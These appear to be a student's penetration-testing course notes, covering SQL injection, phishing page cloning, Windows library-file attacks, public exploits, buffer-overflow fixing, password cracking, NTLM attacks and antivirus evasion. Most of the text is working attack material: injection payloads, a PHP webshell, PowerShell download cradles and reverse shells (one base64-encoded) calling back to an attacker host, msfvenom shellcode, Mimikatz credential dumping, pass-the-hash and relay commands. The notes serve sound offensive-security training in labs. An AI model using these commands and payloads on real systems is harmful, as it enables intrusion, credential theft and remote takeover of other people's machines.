- `select version();  select system_user();  show databases;  SELECT user, authentication_string FROM mysql.user WHERE user ='offsec';`. password hashing [Caching-SHA-256 algorithm]
- `impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth`: remote MSSQL via Kali Impacket  
- `SELECT @@version;  SELECT name FROM sys.databases;  SELECT * FROM offsec.information_schema.tables;  select * from offsec.dbo.users`
- SELECT * FROM users WHERE user_name= 'offsec  `' OR 1=1 --`: bypass login
- Error-based
  - error msg (invalid password) > single quote > payload `' OR 1=1 --//` > enumerate DB `' or 1=1 in (select @@version) -- //` > users `' OR 1=1 in (SELECT * FROM users) -- //`
- Union-based
  - 2 conditions: same number of columns ; data type for each column
  - `' ORDER BY 1-- //`: discover the correct number of columns, increasing the column value by one each time
  - `%' UNION SELECT 'a1', 'a2', 'a3', 'a4', 'a5' -- //`: which columns are displayed
  - `%' UNION SELECT database(), user(), @@version, null, null -- //`: enumerating the DB
  - `' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //`: table
  - `' UNION SELECT null, username, password, description, null FROM users -- //`: column
- Blind-based (boolean or time-based)
  - `offsec' AND 1=1 -- //`: return true if record exist
  - `offsec' AND IF (1=1, sleep(3),'false') -- //`: sleep 3 reconds if true
- xp_cmdshell (manual attack) 
  - Enable xp_cmdshell  
    `impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth`  
    `EXECUTE sp_configure 'show advanced options', 1;`  
    `RECONFIGURE;`  
    `EXECUTE sp_configure 'xp_cmdshell', 1;`  
    `RECONFIGURE;`  
  - `EXECUTE xp_cmdshell 'whoami';`  
- write files on web server
  - `' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE '/var/www/html/webshell.php' #`
  - `192xxx/tmp/webshell.php?cmd=id`  
- Sqlmap (automating attack)
  - `sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user`: find injection point  
  - `sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump`: dump entire database  
  - `sqlmap -r post.txt -p item --os-shell --web-root "/var/www/html"`: os-shell with POST.txt  
    
### 11. Phishing Basics
- broad phishing (mass attacks) and spear phishing (targeted attacks).
- smishing= (SMS phishing), vishing (voice phishing), and deepfake
- objective: malicious code or stealing login credentials
- email domain failter, file attachment
- Malicious Office Macros (Macro). Mark of the Web (MotW）a file attribute set by Windows when a file is downloaded from an external source.
- Malicious files SCR files, HTA files, and JScript files
- `wget -E -k -K -p -e robots=off -H -Dzoom.us -nd "https://zoom.us/signin#/login"`: Cloning the password reset page, using the link sent to us by Zoom
- `sudo python -m http.server 80`
- remove csrfGuard code
- move phishing page to our web server
  ```
  mv -f * /var/www/html
  systemctl start apache2
  cd /var/www/html
  ```
   
### 12. Client-site attacks  
- metadata analysis: google dork (site:example.com filetype:pdf), gobuster -x (file extension)
- `exiftool -a -u brochure.pdf`: retrieve metadata
- [Canarytoken](https://canarytokens.org/nest/): fingerprint
- MOTW (Mark of the Web) is not added to files on FAT32-formatted devices because FAT32 does not support NTFS Alternate Data Streams (ADS), which is where MOTW is stored.
- macros in files downloaded from the internet (with MOTW) are blocked by default, and users can no longer enable them with a single click (like the old “Enable Content” button). Instead, they must explicitly unblock the file via the file properties or follow other administrative steps.
- possible to avoid getting a file flagged with Mark of the Web (MOTW) by embedding it within container formats such as .7z, .iso, or .img

**Obtaining Code Execution via Windows Library Files**  
Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upload/download files, map like a network drive
  ```
  sudo apt install pipx -y
  pipx ensurepath
  pipx install wsgidav
  ```
- Create a shared folder (/home/kali/share)
  `mkdir ~/share`
- Start WsgiDAV server
  `wsgidav --host=0.0.0.0 --port=8888 --auth=anonymous --root ~/share`
- On RDP Windows Machine > Right click PC > Map Network Drive  > `http://<KALI>:8888/`

**Create config.Library-ms**
- Windows Library file used as part of a local file execution or WebDAV attack to achieve arbitrary code execution or remote file retrieval
- Visual Studio Core > New File > Save as 'config.Library-ms'
```
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.45.165</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
- Open the config > WebDAV shared folder appear

**Create ShortCut > PowerShell Download Cradle and PowerCat Reverse Shell Execution**  
- Right click desktop short cut > location `powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.165:8000/powercat.ps1'); powercat -c 192.168.45.165 -p 4444 -e powershell"` >  name: automatic_configuration
- Kali start Python3 web server on port 8000 where powercat.ps1 is located and start a netcat listener on port 4444
  `cd /usr/share/powershell-empire/empire/server/data/module_source/management`
  `python3 -m http.server 8000`
  `nc -nvlp 4444`

**Copy the automatic_configuration.lnk and config.Library-ms to our WebDAV directory on our Kali machine** 
- Obtain a reverse shell from target machine**  
- Upload our library fiiles to the SMB share on the target machine
- On kali cd webdav > `smbclient //192.168.158.199/share -c 'put config.Library-ms'` (target machine IP)
  
**User open the file and Incoming reverse shell from target machine `PS C:\Windows\System32\WindowsPowerShell\v1.0> whoami`**
  
### 13. Locating public exploits  
- An exploit is a program or script that can leverage a flaw or vulnerability of a target system. E.g DoS, RCE, privilege escalation.
- caution: asking root privilege, hex-encoded string of shell command
- online exploit resource
  - [Exploit-DB](https://www.exploit-db.com/)
  - [Packet storm](https://packetstorm.news/)
  - [github](https://github.com/)
  - [offensive-security](https://github.com/offensive-security)
  - `firefox --search "Microsoft Edge site:exploit-db.com"`
  - [Exploit Framework](https://www.oreilly.com/library/view/network-security-assessment/9780596510305/ch16.html)
  - [BeEF](https://beefproject.com/)
- searchsploit
  - `sudo apt update && sudo apt install exploitdb`: update exploitdb package
  - `ls -1 /usr/share/exploitdb/`: CSV for exploit info
  - `ls -1 /usr/share/exploitdb/exploits`: folder in OS, architecture, scripting language
  - `searchsploit -t oracle windows`: can search by -t title, -s strict, -c case sensitive
  - `searchsploit remote smb microsoft windows`: search remote exploits target SMB service on Windows OS
  - `searchsploit -m windows/remote/48537.py`: copied to /home/kali/48537.py
  - `searchsploit -m 42031`: copied windows/remote/42031.py
 

| OS / Target Environment         | Common SearchSploit Commands                                                                 |
|--------------------------------|-----------------------------------------------------------------------------------------------|
| **Linux (General)**            | `searchsploit linux privilege escalation`<br>`searchsploit linux kernel <version>`           |
| **Linux Kernel 2.6.32**        | `searchsploit linux kernel 2.6.32`<br>`searchsploit dirtycow`                                |
| **Linux Kernel 3.x / 4.x**     | `searchsploit linux kernel 3.13`<br>`searchsploit linux kernel 4.4`                          |
| **Ubuntu 16.04**               | `searchsploit ubuntu 16.04`                                                                  |
| **Debian / CentOS**            | `searchsploit debian`<br>`searchsploit centos 7`                                             |
| **Windows (General)**          | `searchsploit windows privilege escalation`<br>`searchsploit windows local`                 |
| **Windows 7 / Server 2008**    | `searchsploit windows 7 local`<br>`searchsploit ms10-092`<br>`searchsploit potato`           |
| **Windows Server 2012 / 2016** | `searchsploit windows server 2016`<br>`searchsploit bypass uac`                              |
| **Web Apps (WordPress, etc.)** | `searchsploit wordpress <version>`<br>`searchsploit joomla`<br>`searchsploit drupal`         |
| **FTP Services**               | `searchsploit vsftpd 2.3.4`                                                                  |
| **Samba**                      | `searchsploit samba 3.0.20`<br>`searchsploit samba`                                          |
| **Apache / Nginx**             | `searchsploit apache 2.4.49`<br>`searchsploit nginx`                                         |
| **Exim Mail Server**           | `searchsploit exim 4.87`                                                                     |
| **MySQL**                      | `searchsploit mysql`                                                                         |
| **Suggesters (Helpful Tools)** | `searchsploit linux exploit suggester`<br>`searchsploit windows exploit suggester`           |
| **CVE Lookup**                 | `searchsploit CVE-2017-16995`<br>`searchsploit CVE-2021-4034` (PwnKit)                        |


- Nmap NSE scripts
  - `grep Exploits /usr/share/nmap/scripts/*.nse`: list NSE scritpt with "Exploits"
  - `nmap --script-help=clamav-exec.nse`: obtain info of NSE script
- Exploit target
  1. open port and service > port 22, 80  
     `nmap 192.168.204.11`  
  3. Browse website and discover emails > jeremy@AIDevCorp.org  
  4. Enumerate website folders > /project  
     `gobuster dir -u 192.168.204.11 -w /usr/share/wordlists/dirb/common.txt -t5`  
  6. page source code > software version qdPM 9.1  
  7. Search exploitDB > https://www.exploit-db.com/exploits/50944  
  8. Brute force password > george@AIDevCorp.org:AIDevCorp
  9. Copy exploit script in kali  
      `searchsploit -m 50944`  
  11. View the exploit.py  
      ```
      parser.add_argument('-url', '--host', dest='hostname', help='Project URL')
      parser.add_argument('-u', '--email', dest='email', help='User email (Any privilege account)')
      parser.add_argument('-p', '--password', dest='password', help='User password')
      ```
  13. Exploit  
      `python3 50944.py -url http://192.168.204.11/project/ -u george@AIDevCorp.org -p AIDevCorp`  
      Output: Backdoor uploaded at - > http://192.168.204.11/project/uploads/users/779889-backdoor.php?cmd=whoami  
  15. automatically url-encode parameter, verify nc installed on the target  
      `curl http://192.168.204.11/project/uploads/users/779889-backdoor.php --data-urlencode "cmd=which nc"`  
  17. Netcat listener  
      `nc -lvnp 6666`  
  19. Start reverse shell  
      `curl http://192.168.204.11/project/uploads/users/779889-backdoor.php --data-urlencode "cmd=nc -nv 192.168.45.160 6666 -e /bin/bash"`  
  20. generate the exploit payload (optional)  
      `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > reverse.exe`
      
### 14. Fixing exploits  
- buffer overflow  
 - **heap** is dynamically managed and typically stores large chunks of globally accessible data  
 - **stack**'s purpose is to store local functions' data, and its size is generally fixed  
 - overwriting the return address with a JMP ESP instruction, which instructs the program to jump to the stack and execute the shellcode
- importing and examing the exploit    
 - `searchsploit "Sync Breeze Enterprise 10.0.28"`
- Cross-compiling exploit code
  - `sudo apt install mingw-w64`: mingw-w64 cross-compiler in Kali
  - compile the code into a Windows Portable Executable (PE)
  - `i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe` > error
  - `i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32` : missing linker to find the winsock library (fixed)
- Fixing the exploit
  - JSM ESP: ESP (Extended Stack Pointer) points to the top of the stack.. A JMP ESP instruction will jump directly to your shellcode
  - Launch "Immunity Debugger" as admin> File > Attach > syncbrs process > view menu > executable modules > verify msvbvm60.dll is not present by checking the Name and Path values
  - modify the 42341.c
   - `nmap -sV -p- 192.168.242.10` (check which port is used for Sync Breeze ports - default 11877)  
   - server.sin_addr.s_addr = inet_addr("192.168.242.10");
   - server.sin_port = htons(80);
   - char request_one[] = "POST /login HTTP/1.1\r\n"  "Host: 192.168.50.120\r\n"  
   - change the return address `unsigned char retn[] = "\xcb\x75\x52\x73"; //ret at msvbvm60.dll`  (refer https://www.exploit-db.com/exploits/42928)
   - generate reverse shell payload with msfvenom (x86, c)
     `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.165 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"`
   - modify the 42341.c  
     ```
     modify unsigned char shellcode[] = 
     "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" // NOP SLIDE
     "\xdb\xcc\xbe\xa5\xcc\x28\x99\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
     ```
   - compile the code  
     `i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32`  
   - setting a breakpoint at JSM ESP: Immunity Debugger > Ctrl + G > 0x10090c83 > F2 breakpoint
   - run the windows exploit using wine
     ```
     sudo dpkg --add-architecture i386
     sudo apt update
     sudo apt install wine winbind wine32 -y
     wine --version

     sudo wine syncbreeze_exploit.exe
     ```
   - application crashes and the EIP register seems to be overwritten by "0x9010090c"
- Changing the overflow buffer
   - Allocating memory for the initial buffer using malloc `int initial_buffer_size = 780;`  
   - Filling the initial buffer with "A" character `memset(padding, 0x41, initial_buffer_size);`  
   - Memset setting the last byte to a null-terminator to convert the buffer into a string `memset(padding + initial_buffer_size - 1, 0x00, 1);`  
   - Creating the final buffer for the exploit
   - Changing the padding allocation size `int initial_buffer_size = 781;`
   - compile the code and start netcat listener on port 443
     `i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32`
     `sudo nc -lvp 443`
   - run the exploit
     `wine syncbreeze_exploit.exe`
- **Fixing web exploits**
  - consideration: http/https, specific web path, pre-authentication vulnerability, GET/POST, rely on app setting
  - syntaxError: Missing parentheses in call to 'print' （it was written for Python2)
  - ssh and start apache service `ssh root@192.168.171.45` `sudo systemctl start apache2`  
  - selecting vulnerability and fixing the code  (apache2, [CMS Made Simple 2.2.5 - (Authenticated) Remote Code Execution](https://www.exploit-db.com/exploits/44976))
    ```
    base_url = "https://10.11.0.128/admin"
    username = "admin"
    password = "HUYfaw763"

    //Modified post requests to ignore SSL verification.
    response  = requests.post(url, data=data, allow_redirects=False, verify=False)
    response = requests.post(url, data=data, files=txt, cookies=cookies, verify=False)
    response = requests.post(url, data=data, cookies=cookies, allow_redirects=False, verify=False)
    ```
  - Troubleshooting the "index out of range" Error
    - Changing the csrf_param variable `csrf_param = "_sk_" # change from "__c"`
  - [+] Exploit succeeded, shell can be found at: https://192.168.171.45/uploads/shell.php
  - `curl -k https://192.168.50.45/uploads/shell.php?cmd=whoami`  
     
### 15. Password attacks  
- **attack network services login**  
  - SSH  
   `hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201`  -l username, -p password wordlist, -s port  
  - RDP (password spraying)  
   `echo -e "daniel\njustin" | sudo tee -a /usr/share/wordlists/dirb/others/names.txt`: add users  
   `hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202`  
  - HTTP POST login  
   `hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"` -l user, -P wordlist, http-post-form
- **mutating wordlist**
  - `echo -n "secret" | sha256sum`: hash secret
  - `sed -i '/^1/d' demo.txt` remove all passwords start with '1'
  - [rule-based attack](https://hashcat.net/wiki/doku.php?id=rule_based_attack) mutate password
  - `echo \$1 > demo.rule`: append 1 to password (new rule)
  - `hashcat -r demo.rule --stdout demo.txt --backend-ignore-opencl`: hashcat debug to display all mutated passwords
  - ```
    cat demo1.rule > hashcat -r demo1.rule --stdout demo.txt

    $1 c
    Password1
    Iloveyou1
    
    $1
    c
    password1
    Password

    $1 c $!
    Password1!

    $! $1 c
    Password!1
    ```
  - capitalization of the first letter + "!" special chr + numerical values  
    `hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r demo3.rule --force`  -m hash type, 0 is MD5
    Output cracked status: f621b6c9eab51a3e2f4e167fee4c6860:Computer123! 
  - hashcat rules `ls -la /usr/share/hashcat/rules/`
- **craking methodology**: extract hashed > format hashes > calculate the cracking time > prepare wordlist > attack the hash
 - identify the hash type:[hash-identifier](https://www.kali.org/tools/hash-identifier/), [hashid](https://www.kali.org/tools/hashid/)
 - hash-identifier "4a41e0fdfb57173f8156f58e49628968a8ba782d0cd251c6f3e2426cb36ced3b647bf83057dabeaffe1475d16e7f62b7": SHA-384
 - bcrypt hashes always start with $2a$, $2b$, or $2y$: "$2y$10$XrrpX8RD6IFvBwtzPuTlcOqJ8kO2px2xsh17f60GZsBKLeszsQTBC"  
- **Password mananger**
  - Searching for KeePass database files
    `Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue`
  - transfer the db file to our Kali
    `xfreerdp3 /u:jason /p:lab /v:192.168.161.203 /cert:ignore /drive:share,/home/kali/share`  
  - Using keepass2john to format the KeePass database for Hashcat
    `keepass2john Database.kdbx > keepass.hash`
    `cat keepass.hash`  remove the "Database"
    `$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0bfd787898d8dcd4d463ee768e55337ff001ddfac98c961219d942fb0cfba*5273cc73b9584fbd843d1ee309d2ba47*1dcad0a3e50f684510c5ab14e1eecbb63671acae14a77eff9aa319b63d71ddb9*17c3ebc9c4c3535689cb9cb501284203b7c66b0ae2fbf0c2763ee920277496c1
`
  - Finding the mode of KeePass in Hashcat
    `hashcat --help | grep -i "KeePass"`  > 13400 | KeePass 1 (AES/Twofish) and KeePass 2 (AES)  | Password Manager
  - Cracking the KeePass database hash
    `hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force` > qwertyuiop123!
- **SSH private key passphrase**
  - Using ssh2john to format the hash  
    `ssh2john id_rsa > ssh.hash`  `cat ssh.hash` 
    id_rsa:$sshng**$6**$16$7059e78a8d3764ea1e8...  
  - Determine the correct mode for Hashcat
    `hashcat -h | grep -i "ssh"` > 22921 | RSA/DSA/EC/OpenSSH Private Keys ($6$)
  - nano **ssh.rule** (Passwords need 3 numbers, a capital letter and a special character)
    ```
    [List.Rules:sshRules]
    c $1 $3 $7 $!
    c $1 $3 $7 $@
    c $1 $3 $7 $#
    ```
  - nano **ssh.passwords**
- failed cracking with Hashcat  
  `hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force` > token length exception  
- add named rules to JtR conf file  
  `sudo sh -c 'cat /home/kali/offsec/passwordattacks/ssh.rule >> /etc/john/john.conf'`  
- crack hash with JtR  
  `john --wordlist=ssh.passwords --rules=sshRules ssh.hash` > Umbrella137!  
- ssh attempt with private key id_rsa  
   ```
   rm ~/.ssh/known_hosts
   chmod 600 id_rsa
   ssh -i id_rsa -p 2222 dave@192.168.161.201
   ```
- **password hashes**  
  - Cracking NTLM
    - NTLM (NT LAN Manager) is a Windows authentication protocol. Hashes stored in C:\Windows\system32\config\sam. Dumped via lsass.exe, pwdump, Mimikatz
    - Goals: get plaintext password from NTLM hash > pivot to othe system > reuse credentials (pass-the-hash, RDP, SMB)
    -  **[Mimikatz](https://github.com/gentilkiwi/mimikatz)** can extract plain-text passwords and password hashes from various sources in Windows and leverage them in further attacks like pass-the-hash (PtH). **Sekurlsa module**, which extracts password hashes from the Local Security Authority Subsystem (LSASS)
    -  [PsExec](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec): elevate our privileges to the SYSTEM account
    - Methodology
      1. Obtain Hash
         - mimikatz: sekurlsa::logonpasswords
         - sass memory dump + pypykatz or mimikatz
         - SAM + SYSTEM hive extraction
         - Remote techniques: secretsdump.py from Impacket  
      3. Format Hash
         - Administrator:500:aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>:::
      5. Choose Attack Mode
         - wordlist, brute force, mash attack, rules-based, hybrid  
      7. Use Cracker
         - `hashcat -m 1000 -a 0 hash.txt rockyou.txt`
         - `john --format=NT hash.txt --wordlist=rockyou.txt`
      9. Analyze Result
          - hashcat.potfile, ~/.john/john.pot  
    - Showing all local users in PowerShell
      `Get-LocalUser`
    - start C:\tools\mimikatz.exe in PowerShell `.\mimikatz.exe`  
    - Enabling SeDebugPrivilege, elevating to SYSTEM user privileges and extracting NTLM hashes
      
      ```
      privilege::debug
      token::elevate
      lsadump::sam
      ```
    - NTLM hash of user nelly in nelly.hash  `nano nelly.hash` 3ae8e5f0ffabb3a627672e1600f1ba10
    - Hashcat mode for NTLM hashes
      `hashcat --help | grep -i "ntlm"` >  1000 | NTLM  | Operating System
    - Crack by using rockyou.txt and best64.rule
      `hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`  
  - **Passing NTLM**
    - pass-the-hash (PtH) technique: authenticate to a local or remote target with a valid combination of username and NTLM hash rather than a plaintext password
    - scenario: gained access to FILES01 as user 'gunther' > want to extract admin NTLM hash and authenticate to FILES02 (SMB share). Assume same password in FILES01 and FILES02
    - [smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html), [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec): SMB enumeration and management
    - [psexec.py](https://github.com/fortra/impacket/blob/master/examples/psexec.py), [wmiexec.py](http://github.com/fortra/impacket/blob/master/examples/wmiexec.py): command execution
    - RDP or [winrm](https://learn.microsoft.com/en-us/windows/win32/winrm/portal) to connect to target
    - windows explorer: \\192.168.139.212\secrets (cannot login FILES02 as user gunther)
    - Enabling SeDebugPrivilege, retrieving SYSTEM user privileges and extracting NTLM hashes
      ```
      .\mimikatz.exe
      privilege::debug
      token::elevate
      lsadump::sam
      ```
    - **smbclient** with NTLM hash  
      `smbclient \\\\192.168.139.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b`  
      `smb: \> get secrets.txt`  
    - **psexec** to get an interactive shell
      `impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212`
      `C:\Windows\system32> hostname`
  - **Cracking Net-NTLMv2**
    - goal: gain access to an SMB share on a Windows 2022 server from a Windows 11 client via NTLMv2
    - NTLM Authentication over SMB
      1. Client → Server: Hello, I want to connect to your SMB share. Here's my username.
      2. Server → Client: Okay. Here's a random challenge (nonce). Prove you're who you say you are
      3. Client → Server: Here's the encrypted challenge response using my NTLM hash.
      4. Server → Itself (lookup): Let me check this response against the stored hash for that user.
      5. Server → Client: Access Granted or ❌ Access Denied
    - [Responder](https://github.com/lgandx/Responder): prints all captured NTLMv2 hashes
    - set up Responder on our Kali machine as an SMB server and use FILES01 (at 192.168.139.211) as the target
      `nc 192.168.139.211 4444`
      `whoami` > files01\paul
      `net user paul` > Remote Desktop Users
    - don't have privileges to run Mimikatz but can set up an SMB server with Responder on Kali, then connect it with user paul and crack NTLMv2 hash
    - Starting Responder on interface tap0 > SMB server is active
      ```
      ip a
      sudo responder -I tun0

      ##if ports in use, kill the process
      sudo systemctl disable smbd
      sudo systemctl disable nmbd
      sudo netstat -tulnp | grep -E '445|139'
      ```
    - Using the dir command to create an SMB connection to our Kali machine  > access is denied
      `dir \\192.168.45.181\test`  > respondener output the NTLMv2 hash of paul
    - save paul hash and crack it with hashcat
      ```
      nano paul.hash

      hashcat --help | grep -i "ntlm"  > 5600 | NetNTLMv2
      hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
      ```
   - RDP as paul `xfreerdp3 /u:paul /p:123Password123 /v:192.168.139.211 /cert:ignore /drive:share,/home/kali/share`
  - **Relaying Net-NTLMv2**
    - sudo ip l s dev tun0 mtu 1250  
    - bind shell to create an SMB connection to Kali > forward to another target (UAC disabled)
    - [ntlmrelayx](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py): setting up SMB server and relaying authentication
    - Starting ntlmrelayx for a Relay-attack targeting FILES02  
      ```
      #kali ip and netcat listener port for target VM2
      pwsh

      $Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.181",8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

      $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
      $EncodedText =[Convert]::ToBase64String($Bytes)
      $EncodedText

      #new terminal
      impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.139.212 -c "powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEAOAAxACIALAA4ADAAOAAwACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
      ```
      
    - netcat listner `nc -nvlp 8080`
    - create VM1 SMB connection `nc 192.168.139.211 5555` (target ip and port) to kali  
      `dir \\192.168.45.181\test`  
    - Incoming reverse shell successfully > `hostname`  > nt authority\system  
    - `cd "C:\Users\files02admin\Desktop"`
- **Windows credential guard**  
   - Logging in to the **CLIENTWK248** machine as a **Domain Administrator**
     `xfreerdp3 /u:"CORP\\Administrator" /p:"QWERTY123\!@#" /v:192.168.133.248 /dynamic-resolution` > sign out of administrator  
   - Logging in to the **CLIENTWK246** as offsec, which is a **local administrator**
     `xfreerdp3 /u:"offsec" /p:"lab" /v:192.168.133.246 /dynamic-resolution`
   - Run terminal as Administrator > cd C:\tools\mimikatz\ > .\mimikatz.exe  
   - Enable SeDebugPrivilege for our local user and then dump all the available credentials with sekurlsa::logonpasswords
     ```
     privilege::debug
     sekurlsa::logonpasswords

     #hashes
     NTLM 246 local admin (offsec): 2892d26cdf84d7a70e2eb3b9f05c425e
     NTLM 248 domain admin (administrator): 160c0b16dd0ee77e7c494e38252f7ddf
     ```
   - Gain access to SERVERWK248 machine as CORP\Administrator (pass the hash)
     `impacket-wmiexec -debug -hashes 00000000000000000000000000000000:160c0b16dd0ee77e7c494e38252f7ddf CORP/Administrator@192.168.50.248`
   - **Circumvented Credential Guard by injecting SSP through Mimikatz**
     - Credential Guard is only designed to protect non-local users  
     - Logging in to the CLIENTWK245 machine as a Domain Administrator that has credential guard
     - Logging in to the CLIENTWK245 machine as a local adminstrator
     - windows terminal run as administrator > Get-ComputerInfo > hashes encrypted
     - Injecting a malicious SSP using Mimikatz
       ```
       privilege::debug
       misc::memssp
       ```
     - close the current RDP (wait another user connect to machine) - Logging in to the **CLIENTWK245** machine as a **Domain Administrator**
     - close the current RDP window and connect to the **CLIENTWK245** as **offsec**
     - type C:\Windows\System32\mimilsa.log (credentials)  
       [00000000:00af2311] CORP\Administrator  QWERTY123!@#

### 16. Antivirus evasion  
- [VirusTotal](https://www.virustotal.com/): general malware detection, [kleenscan.com](https://kleenscan.com/index): stealth testing, red team AV evasion  
- AV engines: file, memory, network, disaaembler, emulator/sandbox, browser plugin, machine learning  
- Detection method: signature, heuristic, behavioral, machine learning   
  ```
  sha256sum malware.txt //calculate SHA256 hash of file
  xxd -b malware.txt  //inspecting the file content with xxd
  ```
- Generate malicious PE meterpreter shell
  `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f exe > binary.exe`
- Bypass AV detection
   - on disk (packers, UPX, enigma protector tool)
   - in-memory (Remote Process Memory Injection, DLL injection, process hollowing, inline hooking)

| Technique                | Description                                                                 | Execution Method                      | Stealth Level | Common APIs Used                                |
|--------------------------|-----------------------------------------------------------------------------|----------------------------------------|----------------|--------------------------------------------------|
| **Remote Process Injection** | Inject shellcode into another process’s memory and execute it               | `CreateRemoteThread`, `QueueUserAPC`   | Medium         | `VirtualAllocEx`, `WriteProcessMemory`       |
| **DLL Injection**            | Inject a DLL into a remote process (standard or reflective)                | `LoadLibrary`, custom loader           | Medium-High    | `VirtualAllocEx`, `CreateRemoteThread`        |
| **Process Hollowing**        | Replace a legitimate process's memory with malicious code                 | `ResumeThread` after memory swap       | High           | `CreateProcess`, `ZwUnmapViewOfSection`        |
